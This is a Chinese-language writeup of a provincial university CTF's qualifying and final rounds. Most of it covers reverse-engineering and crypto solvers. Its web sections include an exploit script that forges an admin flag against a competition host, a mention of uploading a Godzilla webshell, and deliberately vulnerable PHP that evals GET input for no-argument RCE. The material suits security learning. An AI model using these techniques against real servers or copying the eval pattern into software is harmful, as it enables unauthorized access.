# 第七届浙江省大学生网络与信息安全竞赛 Writeup

第七届浙江省大学生网络与信息安全竞赛 Writeup
&lt;!--more--&gt;
## 碎碎念
第二次参加省赛了，去年没拿到的一等奖也是在今年拿到手啦，可惜决赛的rev还差一题没打，因为re手半路跑去看别的方向题了(又要拷打队友了)

还是要吐槽一下，决赛题质量还没预赛高，甚至还有原题🤨，信创的鸿蒙题也不发反编译器(还好我有工具，感谢SHCTF)

线下赛居然还要录屏还要在比赛结束前交wp，搞得最后急急忙忙差点没交上，剩下的题也没时间看，大低是我比赛打少了吧，反正第一次见，吐槽，狠狠的吐槽了
## 预赛
### 前言
预赛运气好摸了个第一，抢了仨一血很舒服hh，队友也很给力✌
![alt text](/images/ZJSS-s7/image-12.png)

### 签到
#### 网安知识大挑战
手做了几遍做不出来，于是去抓包，发现抓不到，那么就是本地验证的了

找到了check的地方，发现flag是调用`d()`得到的，在这打个断点，点提交答案会断下来
![alt text](/images/ZJSS-s7/image-5.png)

然后再控制台里输入`d()`执行一下，就得到flag了
![alt text](/images/ZJSS-s7/image-6.png)

#### 签到题
就是套base
Base92 &gt; base85 &gt; base64 &gt; base62(ascii) &gt; base58 &gt; base45 &gt; base32
![alt text](/images/ZJSS-s7/image-7.png)
### Web
#### easyjs
下载源码，乍一看以为是原型链污染，仔细理一下代码逻辑发现并不是

往`/api/notes`路径下POST传入json，内容为`{&#34;id&#34;: 1, &#34;isAdmin&#34;: 1}`
`id`的值随意，跟一个isAdmin并确保能过`/api/flag`路径下的判断

在请求头中传入`note-id`即可获得flag
这里用python脚本实现，burp有bug
```python
import requests

url = &#34;http://139.155.126.78:32940&#34;
data = {&#34;id&#34;: 1, &#34;isAdmin&#34;: 1}
headers = {&#34;note-id&#34;: &#34;1&#34;}

res = requests.post(url &#43; &#34;/api/notes&#34;, json=data)
print(res.text)

res2 = requests.get(url &#43; &#34;/api/notes/1&#34;)
print(res2.text)

res3 = requests.get(url &#43; &#34;/api/flag&#34;, headers=headers)
print(res3.text)
```

#### 2. hack memory
扫目录，发现`upload`，哥斯拉生成shell直接上传
getshell后在根目录得到flag
![alt text](/images/ZJSS-s7/image-11.png)

### Reverse
#### ezRe
题目给了一个pyc文件，pycdc反编译不出来，那就pycdas反编译字节码然后翻译成python代码
```python
import base64

text = input(&#34;Flag: &#34;)
key = [ord(i) ^ 102 for i in &#39;7e021a7dd49e4bd0837e22129682551b&#39;]

s = list(range(256))
j = 0
for i in range(256):
    j = (j &#43; s[i] &#43; key[i % len(key)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
data = []
for _ in range(50):
    i = (i &#43; 1) % 256
    j = (j &#43; s[i]) % 256
    s[i], s[j] = s[j], s[i]
    data.append(s[(s[i] &#43; s[j]) % 256])

result = &#39;&#39;
for c, k in zip(text, data):
    result &#43;= chr(ord(c) ^ k ^ 51)

enc = base64.b64encode(result.encode()).decode()
if enc == &#39;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#39;:
    print(&#39;yes!&#39;)
else:
    print(&#39;try again...&#39;)
```
很明显就是一个rc4，最后多异或个51，key异或102，注意这个密文utf8编码的问题，要decode一下，卡了半天...

exp:
```python
import base64

cipher = &#39;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#39;
e = base64.b64decode(cipher).decode()

key = [ord(i) ^ 102 for i in &#39;7e021a7dd49e4bd0837e22129682551b&#39;]

s = list(range(256))
j = 0
for i in range(256):
    j = (j &#43; s[i] &#43; key[i % len(key)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
data = []
for _ in range(50):
    i = (i &#43; 1) % 256
    j = (j &#43; s[i]) % 256
    s[i], s[j] = s[j], s[i]
    data.append(s[(s[i] &#43; s[j]) % 256])

flag = &#39;&#39;
for c, k in zip(e, data):
    flag &#43;= chr(ord(c) ^ k ^ 51)

print(flag)
```
#### MidMath
题目从out文件中读取数据，随机生成路径并进行路径计算，需要找到一条正确的路径，加起来大于6668912

动态规划计算出最优路径即可
```python
import hashlib

def md5_16bit(s):
    m = hashlib.md5(s.encode(&#39;utf-8&#39;)).hexdigest()
    res = m[8:24]
    return res

def find_max_path():
    matrix = []

    with open(&#39;out&#39;, &#39;r&#39;) as f:
        row = 1
        curr_row = []
        for num in f.read().split():
            curr_row.append(int(num))
            if len(curr_row) == row:
                matrix.append(curr_row)
                row &#43;= 1
                curr_row = []


    n = len(matrix)
    # dp[i][j] 存储到达位置(i,j)的最大路径和
    dp = [[0] * n for _ in range(n)]
    # path[i][j] 存储到达位置(i,j)的路径选择（1表示向下，2表示向右下）
    path = [[0] * n for _ in range(n)]
    
    dp[0][0] = matrix[0][0]
    
    # 填充dp表
    for i in range(n-1):
        for j in range(i&#43;1):
            if dp[i&#43;1][j] &lt; dp[i][j] &#43; matrix[i&#43;1][j]:
                dp[i&#43;1][j] = dp[i][j] &#43; matrix[i&#43;1][j]
                path[i][j] = 1
            
            if dp[i&#43;1][j&#43;1] &lt; dp[i][j] &#43; matrix[i&#43;1][j&#43;1]:
                dp[i&#43;1][j&#43;1] = dp[i][j] &#43; matrix[i&#43;1][j&#43;1]
                path[i][j] = 2

    # 找出最后一行的最大值
    max_sum = max(dp[-1])

    # 回溯找出路径 
    final_path = []
    curr_j = dp[-1].index(max_sum)
    curr_i = n - 1
    while curr_i &gt; 0:
        if curr_j == 0 or (curr_j &lt;= curr_i and dp[curr_i-1][curr_j-1] &lt; dp[curr_i-1][curr_j]):
            final_path.append(1) 
            curr_i -= 1
        else:
            final_path.append(2) 
            curr_i -= 1
            curr_j -= 1
    
    final_path = final_path[::-1] 
    return &#39;&#39;.join(str(x) for x in final_path)
    

if __name__ == &#34;__main__&#34;:
    path = find_max_path()
    print(md5_16bit(path))
```

#### Midre
有一些简单的花指令nop一下，main函数中将输入异或`what&#39;s this`
![alt text](/images/ZJSS-s7/image.png)

然后修改返回地址跳到另一个函数，就一个AES加密，key和iv都是明文的
![alt text](/images/ZJSS-s7/image-1.png)

厨子直接解一下就完事了
![alt text](/images/ZJSS-s7/image-2.png)

### Misc
#### RealSignin
010查看文件底部发现一段加密 直接解不出来
![alt text](/images/ZJSS-s7/image-8.png)

Stegsolve找lsb有一段类似base64表
![alt text](/images/ZJSS-s7/image-9.png)

Base64换表解码得到flag

![alt text](/images/ZJSS-s7/image-10.png)

### 信创安全
#### sm4rev
题目给了一个shell文件，解压elf到tmp目录然后执行

手动运行一下，以迅雷不及掩耳之势从tmp目录下拿到释放出来的文件，逆向分析一下

结合题目名字，这题应该就一个sm4加密了，找到key和密文
![alt text](/images/ZJSS-s7/image-3.png)

用厨子解一下就完事了
![alt text](/images/ZJSS-s7/image-4.png)

## 决赛
### 前言
好累，没有前言
### 签到
#### 网安知识大挑战-FINAL
做不来一点，干脆直接开爆。结果比赛快结束的时候直接公告里放答案了...
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import itertools


s = [&#34;A&#34;, &#34;B&#34;, &#34;C&#34;, &#34;D&#34;]
lst = itertools.product(s, repeat=10)
enc = bytearray.fromhex(&#34;570fc2416dad7569c13356820ba67ba628c6a5fcbc73f1c8689612d23c3a779befeacf678f93ff5eb4b58dc09dcb9a89&#34;)

for i in lst:
    key = &#34;&#34;.join(i) &#43; &#34;000000&#34;
    iv = &#34;12345678&#34;.encode()
    cipher = Cipher(algorithms.TripleDES(key.encode()), modes.CBC(iv))
    des = cipher.decryptor()
    try:
        r = des.update(enc) &#43; des.finalize()
        if b&#34;DASCTF{&#34; in r and b&#34;}&#34; in r:
            print(r)
            break
    except:
        ...
# DASCTF{Cyber_Security_2024_N1SC_Fina1_JiaY0u}
```

### Crypto
#### MyCode
都说让你爆了那就直接爆呗，key4个字节
```python
import numpy as np
import itertools

def substitute(state, sub_box):
    return [sub_box[b &amp; 0xF] | (sub_box[(b &gt;&gt; 4) &amp; 0xF] &lt;&lt; 4) for b in state]

def generate_round_keys(base_key, rounds):
    round_keys = []
    temp_key = base_key
    for _ in range(rounds):
        round_keys.append(temp_key &amp; 0xFFFFFFFF)
        temp_key ^= ((temp_key &lt;&lt; 1) &amp; 0xFFFFFFFF) | ((temp_key &gt;&gt; 31) &amp; 0x1)
    return round_keys

def process_state(base_key, state, rounds, encrypt):
    sub_box = [0x9, 0x4, 0xA, 0xB, 0xD, 0x1, 0x8, 0x5, 0x6, 0x2, 0x0, 0x3, 0xC, 0xE, 0xF, 0x7]
    inv_sub_box = [0xA, 0x5, 0x9, 0xB, 0x1, 0x7, 0x8, 0xF, 0x6, 0x0, 0x2, 0x3, 0xC, 0x4, 0xD, 0xE]

    round_keys = generate_round_keys(base_key, rounds)

    if encrypt:
        for round in range(rounds):
            state = substitute(state, sub_box)
            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]
    else:
        for round in range(rounds - 1, -1, -1):
            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]
            state = substitute(state, inv_sub_box)

    return state

def encrypt(plaintext, key, rounds=10):
    length = len(plaintext)
    padded_length = length if length % 4 == 0 else length &#43; (4 - (length % 4))
    plaintext &#43;= b&#39;\x00&#39; * (padded_length - length)

    ciphertext = bytearray(padded_length)
    for i in range(0, padded_length, 4):
        state = list(plaintext[i:i&#43;4])
        state = process_state(key, state, rounds, True)
        ciphertext[i:i&#43;4] = state

    return ciphertext

def decrypt(ciphertext, key, rounds=10):
    length = len(ciphertext)
    plaintext = bytearray(length)
    for i in range(0, length, 4):
        state = list(ciphertext[i:i&#43;4])
        state = process_state(key, state, rounds, False)
        plaintext[i:i&#43;4] = state

    return plaintext.rstrip(b&#39;\x00&#39;)
    
s = list(&#34;0123456789abcdef&#34;)
lst = itertools.product(s, repeat=5)

def main():
    cip = bytearray.fromhex(&#34;A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401&#34;)
    for i in lst:
        k = &#34;ECB&#34; &#43; &#34;&#34;.join(i)
        # print(k)
        key = int(k, 16)
        try:
            d = decrypt(cip, key)
            if b&#34;DASCTF{&#34; in d:
                print(d)
        except:
            ...

if __name__ == &#34;__main__&#34;:
    main()
# DASCTF{6ef4d8e1-845a-4e3c-a4e1-a15e5530a0f4}
```

### Misc
#### finalsign
打开文件发现有疑似snow加密

`snow -C FinalSign.txt` 得到 `XORkey=helloworld`

cyberchef异或一下得到flag `DASCTF{F1nal_Sign1n_D0ne}`

### Web
#### wucanrce
源码：
```php
&lt;?php  
echo &#34;get只接受code欧,flag在上一级目录&lt;br&gt;&#34;;  
$filename = __FILE__;  
highlight_file($filename);  
if(isset($_GET[&#39;code&#39;])){  
    if (!preg_match(&#39;/session_id\(|readfile\(/i&#39;, $_GET[&#39;code&#39;]))  
  
     {  
        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]&#43;\((?R)?\)/&#39;, NULL, $_GET[&#39;code&#39;])) {  
                @eval($_GET[&#39;code&#39;]);  
            }  
         
    }  
    else{  
        die(&#34;不让用session欧，readfile也不行&#34;);  
    }  
}  
?&gt;
```

无参数RCE，ban了session_id与readfile，直接利用header实现rce
![alt text](/images/ZJSS-s7/web.png)

### Reverse
#### Reverse1
第一眼rc4，马上用厨子梭一下没梭出来，再看一眼，哎我去好眼熟，好的就是今年宁波市赛的原题，套个exp直接秒了
```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#define BYTE unsigned char

void __fastcall init(BYTE *a1, BYTE *a2, unsigned __int64 a3)
{
  BYTE v3; // [rsp&#43;23h] [rbp-41Dh]
  int i; // [rsp&#43;24h] [rbp-41Ch]
  int v5; // [rsp&#43;28h] [rbp-418h]
  int j; // [rsp&#43;2Ch] [rbp-414h]
  int v7[258]; // [rsp&#43;30h] [rbp-410h] BYREF
  unsigned __int64 v8; // [rsp&#43;438h] [rbp-8h]

  memset(v7, 0, 0x400uLL);
  for ( i = 0; i &lt;= 255; &#43;&#43;i )
  {
    a1[i] = i;
    v7[i] = a2[i % a3];
  }
  v5 = 0;
  for ( j = 0; j &lt;= 255; &#43;&#43;j )
  {
    v5 = (v7[j] &#43; v5 &#43; a1[j]) % 256;
    v3 = a1[j];
    a1[j] = a1[v5];
    a1[v5] = v3;
  }
}

void __fastcall crypt1(BYTE *a1, BYTE *a2, unsigned __int64 a3)
{
  BYTE v3; // [rsp&#43;27h] [rbp-11h]
  int v4; // [rsp&#43;28h] [rbp-10h]
  int v5; // [rsp&#43;2Ch] [rbp-Ch]
  int i; // [rsp&#43;30h] [rbp-8h]

  v4 = 0;
  v5 = 0;
  for ( i = 0; a3 &gt; i; &#43;&#43;i )
  {
    v4 = (v4 &#43; 1) % 256;
    v5 = (v5 &#43; a1[v4]) % 256;
    v3 = a1[v4];
    a1[v4] = a1[v5];
    a1[v5] = v3;
    a2[i] ^= a1[(unsigned __int8)(a1[v4] &#43; a1[v5])];
  }
}

void __fastcall crypt2(BYTE *a1, BYTE *a2, unsigned __int64 a3)
{
  BYTE v3; // [rsp&#43;27h] [rbp-11h]
  int v4; // [rsp&#43;28h] [rbp-10h]
  int v5; // [rsp&#43;2Ch] [rbp-Ch]
  int i; // [rsp&#43;30h] [rbp-8h]

  v4 = 0;
  v5 = 0;
  for ( i = 0; a3 &gt; i; &#43;&#43;i )
  {
    v4 = (v4 &#43; 1) % 256;
    v5 = (v5 &#43; a1[v4]) % 256;
    v3 = a1[v4];
    a1[v4] = a1[v5];
    a1[v5] = v3;
    a2[i] &#43;= a1[(unsigned __int8)(a1[v4] &#43; a1[v5])];
  }
}

unsigned char key[] = &#34;ban_debug!&#34;;
unsigned char key1[] = &#34;keykey&#34;;

unsigned char cipher[] =
{
  0x4e,0x47,0x38,0x47,0x62,0x0a,0x79,0x6a,0x03,0x66,0xc0,0x69,0x8d,0x1c,0x84,0x0f,0x54,0x4a,0x3b,0x08,0xe3,0x30,0x4f,0xb9,0x6c,0xab,0x36,0x24,0x52,0x81,0xcf
};


int main() {
    unsigned char s[1000];
    memset(s, 0, 256);
    init(s, key1, strlen(key1));
    crypt1(s, key, strlen(key));
    init(s, key, strlen(key));
    crypt2(s, cipher, strlen(cipher));
    printf(&#34;%s&#34;, cipher);
}
// flag{1237-12938-9372-1923-4u92}
```

#### Reverse2
就一换表base64，厨子解一下
![alt text](/images/ZJSS-s7/image-13.png)

### 数据安全
#### datasecurity_classify1
按要求做数据清洗即可
```python
with open(r&#34;data/data.csv&#34;, &#34;r&#43;&#34;, encoding=&#34;utf-8&#34;) as fp:
    data = fp.read()
    
print(data)

with open(r&#34;data/data_solve.csv&#34;, &#34;w&#43;&#34;, encoding=&#34;utf-8&#34;) as fp:
    fp.write(&#34;类型,数据值\n&#34;)
    for i in data.split(&#34;\n&#34;):
        if not i.isascii():
            fp.write(f&#34;姓名,{i}\n&#34;)
        elif len(i) == 18:
            fp.write(f&#34;身份证号,{i}\n&#34;)
        elif len(i) == 11:
            fp.write(f&#34;手机号,{i}\n&#34;)
            
```

### 信创安全
#### OH
abc-decomplier反编译一下，因为没办法调试，就只能看反编译后的结果硬猜了

```ts
package com.zjuctf2024.easyhap.entry.ets.cipherUtil;

/* loaded from: D:\CTF\Event\ZJSS\final\modules.abc */
class CipherUtil {

    /* renamed from: pkgName@entry, reason: not valid java name */
    public Object f0pkgNameentry;
    public Object isCommonjs;
    public Object moduleRecordIdx;

    public Object #1#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object obj = _lexenv_0_2_.cipherX;
        Object init = obj.init(import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;.CryptoMode.ENCRYPT_MODE, arg0, 0);
        return init.then(#2#);
    }

    public Object #2#(Object functionObject, Object newTarget, CipherUtil this) {
        Object obj = _lexenv_0_2_.cipherX;
        return obj.doFinal(_lexenv_0_0_);
    }

    public Object #3#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object obj = _lexenv_0_3_.cipherY;
        Object init = obj.init(import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;.CryptoMode.ENCRYPT_MODE, arg0, _lexenv_0_0_);
        return init.then(#4#);
    }

    public Object #4#(Object functionObject, Object newTarget, CipherUtil this) {
        Object obj = _lexenv_0_3_.cipherY;
        return obj.doFinal(_lexenv_0_1_);
    }

    public Object #5#(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        arg0(&#34;&#34;);
        return null;
    }

    public Object #6#(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        newlexenv(1);
        _lexenv_0_0_ = arg0;
        Object ldlexvar = _lexenv_1_5_;
        Object encryptX = ldlexvar.encryptX(_lexenv_1_0_);
        encryptX.then(#7#);
        return null;
    }

    public Object #7#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        _lexenv_1_1_ = arg0.data;
        Object ldlexvar = _lexenv_1_5_;
        Object encryptY = ldlexvar.encryptY(_lexenv_1_2_, _lexenv_1_1_);
        encryptY.then(#8#);
        return null;
    }

    public Object #8#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        _lexenv_1_3_ = arg0.data;
        Object ldlexvar = _lexenv_1_5_;
        Object encodeX = ldlexvar.encodeX(_lexenv_1_1_, _lexenv_1_3_);
        Object ldlexvar2 = _lexenv_1_5_;
        _lexenv_0_0_(ldlexvar2.encodeY(encodeX));
        return null;
    }

    public Object init(Object functionObject, Object newTarget, CipherUtil this) {
        Object cryptoFramework = import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;;
        this.cipherX = cryptoFramework.createCipher(this.cipherAlgX);
        Object cryptoFramework2 = import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;;
        this.cipherY = cryptoFramework2.createCipher(this.cipherAlgY);
        Object obj = createobjectwithbuffer([&#34;data&#34;, 0]);
        obj.data = this.stringToUint8Array(this.commonCipherKeyStr);
        this.commonCipherKey = obj;
        return null;
    }

    /* JADX WARN: Type inference failed for: r14v16, types: [int] */
    /* JADX WARN: Type inference failed for: r14v18, types: [int] */
    public Object encodeX(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        Object[] objArr = [Object];
        for (int i = 0; isfalse((i &lt; 16 ? 1 : 0)) == null; i&#43;&#43;) {
            objArr.push(arg1[i]);
        }
        for (int i2 = 0; isfalse((i2 &lt; 16 ? 1 : 0)) == null; i2&#43;&#43;) {
            objArr.push(arg0[i2] ^ arg1[i2]);
        }
        return Uint8Array(objArr);
    }

    /* JADX WARN: Type inference failed for: r6v2, types: [Object, java.lang.Class] */
    public Object encodeY(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object newobjrange = import { default as util } from &#34;@ohos:util&#34;.Base64Helper();
        return newobjrange.encodeToStringSync(arg0);
    }

    public Object encrypt(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        newlexenv(6);
        _lexenv_0_4_ = newTarget;
        _lexenv_0_5_ = this;
        _lexenv_0_3_ = null;
        _lexenv_0_1_ = null;
        if (isfalse((arg0.length != 32 ? 1 : 0)) == null) {
            return Promise(#5#);
        }
        Object ldlexvar = _lexenv_0_5_;
        _lexenv_0_0_ = ldlexvar.stringToUint8Array(arg0.slice(0, 16));
        Object ldlexvar2 = _lexenv_0_5_;
        _lexenv_0_2_ = ldlexvar2.stringToUint8Array(arg0.slice(16, 32));
        return Promise(#6#);
    }

    public Object encryptX(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        newlexenv(3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        Object obj = createobjectwithbuffer([&#34;data&#34;, 0]);
        obj.data = arg0;
        _lexenv_0_0_ = obj;
        Object cryptoFramework = import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;;
        Object createSymKeyGenerator = cryptoFramework.createSymKeyGenerator(_lexenv_0_2_.cipherAlgName);
        Object convertKey = createSymKeyGenerator.convertKey(_lexenv_0_2_.commonCipherKey);
        return convertKey.then(#1#);
    }

    public Object encryptY(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        newlexenv(4);
        _lexenv_0_2_ = newTarget;
        _lexenv_0_3_ = this;
        Object obj = createobjectwithbuffer([&#34;data&#34;, 0]);
        obj.data = arg0;
        _lexenv_0_1_ = obj;
        Object obj2 = createobjectwithbuffer([&#34;algName&#34;, &#34;IvParamsSpec&#34;, &#34;iv&#34;, 0]);
        Object obj3 = createobjectwithbuffer([&#34;data&#34;, 0]);
        obj3.data = arg1;
        obj2.iv = obj3;
        _lexenv_0_0_ = obj2;
        Object cryptoFramework = import { default as cryptoFramework } from &#34;@ohos:security.cryptoFramework&#34;;
        Object createSymKeyGenerator = cryptoFramework.createSymKeyGenerator(_lexenv_0_3_.cipherAlgName);
        Object convertKey = createSymKeyGenerator.convertKey(_lexenv_0_3_.commonCipherKey);
        return convertKey.then(#3#);
    }

    public Object CipherUtil(Object functionObject, Object newTarget, CipherUtil this) {
        this.cipherAlgName = &#34;AES128&#34;;
        this.cipherAlgX = &#34;AES128|ECB|NoPadding&#34;;
        this.cipherAlgY = &#34;AES128|CBC|NoPadding&#34;;
        this.commonCipherKeyStr = &#34;DASCTF2024-OHAPP&#34;;
        this.init();
        return this;
    }

    public Object func_main_0(Object functionObject, Object newTarget, CipherUtil this) {
        Object CipherUtil = hole.CipherUtil(Object2, Object3, hole, [&#34;init&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.init&#34;, 0, &#34;encryptX&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptX&#34;, 1, &#34;encryptY&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptY&#34;, 2, &#34;encodeX&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeX&#34;, 2, &#34;encodeY&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeY&#34;, 1, &#34;encrypt&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encrypt&#34;, 1, &#34;stringToUint8Array&#34;, &#34;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.stringToUint8Array&#34;, 1, 7]);
        Object obj = CipherUtil.prototype;
        _module_0_ = CipherUtil;
        return null;
    }

    public Object stringToUint8Array(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object buffer = import { default as buffer } from &#34;@ohos:buffer&#34;;
        return Uint8Array(buffer.from(arg0, &#34;utf-8&#34;).buffer);
    }
}
```
有一点干扰项，比如AES-ECB其实根本没用到，卡了好半天

输入内容调用encrypt进行加密，长度为32，先把输入分为前16个字节和后16字节，然后调用AES-CBC加密，key为`DASCTF2024-OHAPP`, iv直接补0

encodeX中把后16字节放到前面，然后把前后16字节异或一下放到了后面，encodeY用base64编码一下

加密顺序猜出来后厨子解一下就好喽
![alt text](/images/ZJSS-s7/image-14.png)

---

> Author: yuro  
> URL: /posts/8e67efa/  

